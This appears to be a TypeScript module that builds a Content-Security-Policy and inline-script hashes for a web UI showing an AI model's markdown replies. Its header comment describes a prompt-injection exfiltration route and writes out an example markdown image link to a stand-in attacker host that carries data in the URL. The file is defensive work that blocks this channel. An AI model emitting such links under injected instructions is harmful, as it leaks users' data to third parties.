import { createHash } from "node:crypto";
import { readFileSync, statSync } from "node:fs";
import { join } from "node:path";

/**
 * Content-Security-Policy for the UI. The model's output reaches the page as markdown, so a prompt-injected
 * reply can make the browser fetch any URL just by rendering `![x](https://attacker/?d=…)`. The policy lets
 * the page load images only from itself (`/api/blob/…`), `data:` and `blob:` URLs and talk only to its own
 * origin, which also closes the same channel to a script, a stylesheet or a fetch.
 */

/** The loopback hostnames a request can reach the server by; `host[:port]`, as in the Host header. */
const HOST = /^[A-Za-z0-9.-]+(:\d+)?$/;

/**
 * The policy for a document served to `host` (the request's Host header). `inlineScripts` are the sha256
 * sources of the document's own inline scripts, which are otherwise refused.
 */
export function contentSecurityPolicy(host: string | null, inlineScripts: readonly string[]): string {
	// WebSocket: `'self'` covers it in current browsers; older WebKit only matches the ws(s) scheme explicitly.
	// A bracketed IPv6 host cannot be written as a CSP host source, so it relies on `'self'`.
	const socket = host && HOST.test(host) ? ` ws://${host} wss://${host}` : "";
	return [
		"default-src 'self'",
		// Scripts, including the highlighter's worker (`worker-src` falls back to this): the page's own files and the inline
		// scripts hashed below. No `eval` of any kind: shiki's JavaScript regex engine only builds RegExp objects.
		`script-src 'self'${inlineScripts.map((s) => ` ${s}`).join("")}`,
		// Inline style attributes: shiki's highlighted code, and libraries that add a <style> at runtime.
		"style-src 'self' 'unsafe-inline'",
		"img-src 'self' data: blob:",
		`connect-src 'self'${socket}`,
		"object-src 'none'",
		"base-uri 'self'",
		"form-action 'self'",
		"frame-ancestors 'none'",
	].join("; ");
}

/** `'sha256-…'` sources for every inline `<script>` in `html`, as the browser hashes its text. */
export function inlineScriptHashes(html: string): string[] {
	const hashes: string[] = [];
	for (const m of html.matchAll(/<script\b((?:[^>"']|"[^"]*"|'[^']*')*)>([\s\S]*?)<\/script\s*>/gi)) {
		if (/\ssrc\s*=/i.test(m[1])) continue;
		// The HTML parser turns CR and CRLF into LF before the text is hashed.
		const text = m[2].replace(/\r\n?/g, "\n");
		hashes.push(`'sha256-${createHash("sha256").update(text).digest("base64")}'`);
	}
	return hashes;
}

let indexHashes: { file: string; mtimeMs: number; hashes: string[] } | null = null;

/** The inline-script sources of the built `index.html`, read again whenever the file changes (a rebuild). */
export function indexScriptHashes(distDir: string): string[] {
	const file = join(distDir, "index.html");
	try {
		const { mtimeMs } = statSync(file);
		if (indexHashes?.file !== file || indexHashes.mtimeMs !== mtimeMs) {
			indexHashes = { file, mtimeMs, hashes: inlineScriptHashes(readFileSync(file, "utf8")) };
		}
		return indexHashes.hashes;
	} catch {
		return []; // not built yet: there is no document to serve
	}
}
